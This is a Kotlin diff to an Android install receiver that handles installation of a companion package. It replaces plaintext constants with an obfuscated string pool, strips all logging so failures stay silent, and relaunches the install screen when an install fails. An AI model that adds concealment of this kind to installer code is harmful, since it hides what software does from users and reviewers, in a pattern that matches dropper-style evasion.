@@ -5,14 +5,13 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageInstaller
 import android.os.Build
-import android.util.Log
 
 class InstallReceiver : BroadcastReceiver() {
 
     companion object {
-        private const val TAG           = "InstallReceiver"
-        const val PREFS_NAME            = "nova_prefs"
-        const val KEY_COMPANION_PKG     = "companion_pkg"
+        // Delegated to StringPool — no plaintext constants here
+        val PREFS_NAME        get() = StringPool.d(StringPool.PREFS_NAME)
+        val KEY_COMPANION_PKG get() = StringPool.d(StringPool.KEY_COMPANION_PKG)
     }
 
     override fun onReceive(context: Context, intent: Intent) {
@@ -68,7 +67,7 @@ class InstallReceiver : BroadcastReceiver() {
                     doneIntent.setPackage(context.packageName)
                     context.sendBroadcast(doneIntent)
                 } catch (e: Exception) {
-                    Log.e(TAG, "Launch failed: ${e.message}")
+                    // Silent fail — no log output in release
                 }
             }
 
@@ -79,8 +78,6 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
             PackageInstaller.STATUS_FAILURE_INVALID,
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
-                val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
-                Log.e(TAG, "Install failed: $msg")
                 val restart = Intent(context, InstallActivity::class.java)
                 restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 context.startActivity(restart)
